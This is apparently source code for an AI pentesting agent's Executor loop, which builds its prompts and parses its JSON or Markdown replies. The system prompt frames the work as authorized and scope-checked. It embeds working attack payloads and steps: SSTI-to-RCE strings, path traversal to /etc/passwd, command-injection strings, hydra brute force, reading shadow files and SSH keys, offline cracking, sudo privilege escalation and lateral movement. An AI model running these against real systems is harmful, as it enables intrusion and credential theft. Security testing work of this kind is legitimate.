"""Prompt construction + tolerant reply parsing for the Executor loop. Free-text prompts
(no JSON mode) + JSON-then-Markdown parsing, per Sensei's experience with local GGUF models."""
import re
from dataclasses import dataclass

from grin.finding import Finding, normalize_severity
from grin.jsonextract import extract_json
from grin.secret import Secret

SYSTEM = (
    "You are Grin's Executor, an autonomous penetration-testing agent operating under an "
    "explicit, human-authorized, scope-bound engagement. You accomplish ONE objective by "
    "driving Kali/BlackArch tools. Every action you propose is checked by a scope/ROE "
    "gatekeeper before it runs; out-of-scope or disallowed actions are refused and you must "
    "adapt. Be EFFICIENT: a strong operator reaches the goal in the FEWEST actions by reading "
    "each result and following the lead it reveals — not by guessing many things. Propose the "
    "SINGLE next action, or finish with findings. Reply with ONE JSON object and nothing else."
)


def build_step_prompt(objective: str, target: str, journal, allowed_classes) -> tuple[str, str]:
    history = journal.render_history()
    user = (
        f"Objective: {objective}\n"
        f"Authorized target: {target}\n"
        f"Permitted action classes (ROE): {', '.join(allowed_classes)}\n\n"
        f"History so far:\n{history}\n\n"
        "## Read the result, then chase the lead (most important rule)\n"
        "Before deciding, READ the most recent result above. If it reveals anything specific — an "
        "HTML comment (`<!-- ... -->`), a link or referenced path, an endpoint, a parameter name, a "
        "version string, a username, or a credential — your VERY NEXT action MUST act on that exact "
        "lead. Do NOT guess random paths/inputs when the output already points somewhere, and do NOT "
        "ignore a hint you were just shown. Following what the tool already revealed is the fastest "
        "route to the goal.\n"
        "For web targets: fetch the page, then READ the response body for comments, links, and "
        "referenced paths, and request THOSE paths directly — don't blindly guess common paths first.\n\n"
        "## Web application methodology (don't stop at the landing page)\n"
        "A plain-looking page is rarely the whole app. Actively probe it:\n"
        "- Discover hidden content with `gobuster dir -u http://<target> -w "
        "/usr/share/wordlists/dirb/common.txt` (or ffuf) and `curl http://<target>/robots.txt`.\n"
        "- FUZZ PARAMETERS — many vulns live on a parameter that is NOT linked anywhere. Test common "
        "names on every endpoint: `file path page name id q search cmd host url user` "
        "(e.g. `curl 'http://<target>/?name=test'`, `?file=test`). A reflected value or a behaviour "
        "change means you found the input.\n"
        "- For each parameter, test the injection classes IN ORDER and read the response:\n"
        "    * SSTI: `?name={{7*7}}` — if the reply shows `49`, it's template injection -> RCE "
        "(escalate with `{{cycler.__init__.__globals__.os.popen('id').read()}}`).\n"
        "    * Path traversal / LFI: `?file=../../../../etc/passwd` — reads arbitrary files.\n"
        "    * OS command injection: `?host=127.0.0.1;id` / `| id` / `$(id)`.\n"
        "    * SQLi: `sqlmap -u 'http://<target>/?id=1' --batch`.\n\n"
        "## Enumerate before you guess (most-missed step)\n"
        "The moment you gain file-read (traversal/LFI) OR code execution, LIST directories instead of "
        "guessing individual filenames — guessing wastes turns and misses things. Run `ls -la` on the "
        "high-value locations and READ what's there:\n"
        "  `/`  `/home` and each `/home/<user>`  `/root`  `/opt`  `/srv`  `/var/backups`  `/etc`  `/tmp`  "
        "the web app's own dir (e.g. `/app`, `/var/www`).\n"
        "Hunt specifically for: SSH keys (`id_rsa`, `*.pem`, `authorized_keys`), password hashes "
        "(`/etc/shadow`, `/var/backups/*.bak`, `.htpasswd`), configs/secrets (`.env`, `config.*`, "
        "`*.conf`), and notes/READMEs naming other hosts or accounts. When `cat <guessed path>` 404s or "
        "is denied, do NOT keep guessing siblings — `ls` the parent directory first.\n\n"
        "## Phase progression\n"
        "Work through these phases in order:\n"
        "  1. Recon — discover open ports and running services (one scan is enough).\n"
        "  2. Identify the specific weakness — version-based vuln, weak credentials, injectable param, etc.\n"
        "  3. Exploit it — use the appropriate tool to gain access or extract the proof.\n"
        "  4. Escalate — if you have a foothold but the proof (e.g. a root-owned file) is not readable "
        "as the current user, ENUMERATE privilege escalation; do not just retry the same read.\n"
        "  5. Capture proof — read the flag file, dump credentials, or confirm the shell.\n"
        "The objective is NOT complete until exploitation has been attempted and the requested proof captured.\n\n"
        "## Anti-repeat rule\n"
        "Do NOT repeat any command already shown in History. "
        "Once a port or service is identified, move on to exploiting it — do not re-scan.\n\n"
        "## Exploit-tool reference (use what fits the situation)\n"
        "- Weak SSH credentials: curated credential lists are present on the runner at "
        "`/usr/share/wordlists/users.txt` (usernames) and `/usr/share/wordlists/passwords.txt` "
        "(passwords). Use them with `hydra -L /usr/share/wordlists/users.txt "
        "-P /usr/share/wordlists/passwords.txt ssh://<target>` (small + fast). Do NOT use rockyou as "
        "a USERNAME list (-L). When hydra prints a line like `login: admin password: hunter2`, "
        "take the ACTUAL username and password it found (NOT the literal letters from this example) "
        "and log in: `sshpass -p <the-found-password> ssh <the-found-username>@<target> "
        "'cat ~/flag.txt'`, then record the real `username:password` you obtained in `secrets`.\n"
        "  The full rockyou list (~14M passwords) is at `/usr/share/wordlists/rockyou.txt`. Prefer the "
        "small curated list FIRST for online brute (fast). Only escalate to rockyou ONLINE in a capped "
        "form (e.g. `head -2000 /usr/share/wordlists/rockyou.txt > /tmp/p && hydra -P /tmp/p ...`) — a "
        "full 14M-password ONLINE SSH/web brute is far too slow to finish. rockyou's real strength is "
        "OFFLINE cracking (see below).\n"
        "- Offline password cracking: this is a PRIMARY tactic, not a last resort — actively hunt for "
        "crackable material (a hash in /etc/shadow, /var/backups/*.bak, a config; a password-protected "
        "ZIP/PDF/KeePass). When you find ANY hash, crack it OFFLINE with the full rockyou list — "
        "`john --wordlist=/usr/share/wordlists/rockyou.txt <hashfile>` then `john --show <hashfile>` "
        "(or `hashcat -m <mode> <hashes> /usr/share/wordlists/rockyou.txt`) — then use the recovered "
        "password to log in. This is where the 14M list pays off (millions of guesses/sec locally, no "
        "network/lockout limits), unlike online brute.\n"
        "- Passphrase-protected SSH key: if a private key (`id_rsa`) asks for a passphrase, CRACK IT "
        "OFFLINE: `ssh2john id_rsa > key.hash && john --wordlist=/usr/share/wordlists/rockyou.txt "
        "key.hash && john --show key.hash`, then decrypt with the passphrase "
        "(`ssh-keygen -p -P <passphrase> -N '' -f id_rsa`) and use `ssh -i id_rsa <user>@<host>`. A "
        "locked key is not a dead end.\n"
        "- Lateral movement / pivot: if the flag/proof is NOT on this host (or the goal says it lives "
        "elsewhere), use creds/keys you found here to reach OTHER in-scope hosts. Scan the rest of the "
        "authorized scope for live hosts + services (`nmap -sn <range>`, then `nmap -sV <host>`), then "
        "`ssh -i <key> <user>@<other-host>` (the key/README usually names the account). The flag may be "
        "one hop away.\n"
        "- Web command injection: test parameters with `curl` and chain shell metacharacters "
        "(e.g. `; cat /flag`, `| id`)\n"
        "- Once you have a shell or file-read primitive: `cat /flag`, `cat /root/secret`, etc.\n"
        "- Privilege escalation (use when you have code execution as a low-priv user but the proof is "
        "a protected/root-owned file you cannot read): a 'Permission denied' on the flag means ESCALATE, "
        "not retry. First enumerate: `sudo -l` (sudo rights), `find / -perm -4000 -type f 2>/dev/null` "
        "(SUID binaries), `id`. If `sudo -l` shows a NOPASSWD binary, abuse it via GTFOBins — e.g. find: "
        "`sudo find <flagfile> -exec cat {} \\;` (or `sudo find . -exec cat /root/flag.txt \\; -quit`); "
        "vim/less/awk/python similarly spawn a root read/shell. Run the privesc command through your "
        "existing primitive (e.g. the same injection parameter).\n"
        "- FTP anonymous login: `ftp <target>` with user `anonymous`\n"
        "- SMB shares: `smbclient -L //<target> -N` then `smbclient //<target>/<share> -N`\n\n"
        "Decide the SINGLE next action, or finish if the objective is met.\n\n"
        "## Target field rule\n"
        "The `target` field must be a HOST or IP from the authorized scope — NEVER a file path or directory.\n\n"
        "## Credential-capture rule\n"
        "The moment you obtain credentials (e.g. hydra reports a valid login, or you confirm a password), "
        "IMMEDIATELY use them to log in (e.g. `sshpass -p <pw> ssh <user>@<target> 'cat <flagfile>'`) "
        "and capture the proof. ALWAYS record any credentials you obtain in the `secrets` array "
        "(with the full value) before finishing — a captured credential that is not recorded is lost.\n\n"
        "To act, reply EXACTLY:\n"
        '{"action": {"tool": "<tool>", "command": "<your command>", '
        f'"target": "{target}", "declared_class": "<permitted-class>", '
        '"why": "short reason"}}\n\n'
        "To finish, reply EXACTLY:\n"
        '{"done": true, "findings": [{"title": "...", '
        '"severity": "info|low|medium|high|critical", "evidence": "...", "tool": "...", '
        '"command": "...", "recommendation": "..."}], '
        '"secrets": [{"label": "...", "value": "...", "target": "...", "tool": "...", '
        '"command": "...", "context": "..."}]} '
        "(include any credentials/keys/tokens you actually obtained in `secrets`, with full values; "
        "omit the secrets array or leave it empty if none were captured)\n\n"
        "Return ONLY the JSON object."
    )
    return SYSTEM, user


@dataclass
class StepDecision:
    kind: str
    action: dict | None = None
    findings: list | None = None
    secrets: list | None = None


def _extract_json(raw: str):
    # robust: first balanced JSON object bearing an executor key (handles a valid action followed
    # by trailing prose or an echoed done-template). See grin/jsonextract.py.
    return extract_json(raw, want=("action", "done", "findings"))


def _parse_secrets(items, default_target) -> list:
    out = []
    for it in items or []:
        if not isinstance(it, dict):
            continue
        label = str(it.get("label", "")).strip()
        value = str(it.get("value", "")).strip()
        if not (label and value):
            continue
        out.append(Secret(
            label=label, value=value,
            target=str(it.get("target") or default_target).strip(),
            tool=str(it.get("tool", "")).strip(),
            command=str(it.get("command", "")).strip(),
            context=str(it.get("context", "")).strip(),
        ))
    return out


def _parse_findings(items, default_target) -> list:
    out = []
    for it in items or []:
        if not isinstance(it, dict):
            continue
        title = str(it.get("title", "")).strip()
        if not title:
            continue
        out.append(Finding(
            title=title,
            target=str(it.get("target") or default_target).strip(),
            severity=normalize_severity(it.get("severity")),
            evidence=str(it.get("evidence", "")).strip(),
            tool=str(it.get("tool", "")).strip(),
            command=str(it.get("command", "")).strip(),
            recommendation=str(it.get("recommendation", "")).strip(),
        ))
    return out


_CMD_RE = re.compile(r"(?im)^\s*[#>*\-\s]*\**\s*command\s*\**\s*:\s*(.+)$")


def _maybe_prepend_tool(tool: str, command: str) -> str:
    """If command's first token starts with '-' (binary was dropped), prepend the tool name."""
    if tool and command:
        first_token = command.split()[0] if command.split() else ""
        if first_token.startswith("-"):
            return f"{tool} {command}"
    return command


def parse_step(raw: str, default_target: str) -> StepDecision:
    data = _extract_json(raw)
    if isinstance(data, dict):
        act = data.get("action")
        if isinstance(act, dict) and str(act.get("tool", "")).strip() \
                and str(act.get("command", "")).strip():
            dc = act.get("declared_class")
            tool = str(act["tool"]).strip()
            command = _maybe_prepend_tool(tool, str(act["command"]).strip())
            return StepDecision("action", action={
                "tool": tool,
                "command": command,
                "target": str(act.get("target") or default_target).strip(),
                "declared_class": str(dc).strip() if dc else None,
                "why": str(act.get("why", "")).strip(),
            })
        if data.get("done") or "findings" in data:
            return StepDecision("done",
                                findings=_parse_findings(data.get("findings", []), default_target),
                                secrets=_parse_secrets(data.get("secrets", []), default_target))
    # Markdown fallback: a "Command:" line -> an action (tool = first token).
    m = _CMD_RE.search(raw or "")
    if m:
        command = m.group(1).strip().strip("`").strip()
        if command:
            return StepDecision("action", action={
                "tool": command.split()[0], "command": command,
                "target": default_target, "declared_class": None, "why": "",
            })
    return StepDecision("parse_miss")
